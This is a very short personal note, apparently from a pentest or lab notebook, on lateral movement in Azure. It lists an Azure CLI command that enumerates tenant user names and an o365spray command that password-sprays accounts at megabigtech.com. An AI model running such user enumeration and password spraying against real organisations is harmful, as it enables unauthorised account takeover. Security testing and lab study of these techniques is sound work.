Laterail Movement {Internal Attack Vector}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
az ad user list --query "[].userPrincipalName" --output tsv
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python3 o365spray.py --spray -U users.txt -P pass.txt --lockout 5 --domain megabigtech.com
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![[lateral movement azure.png]]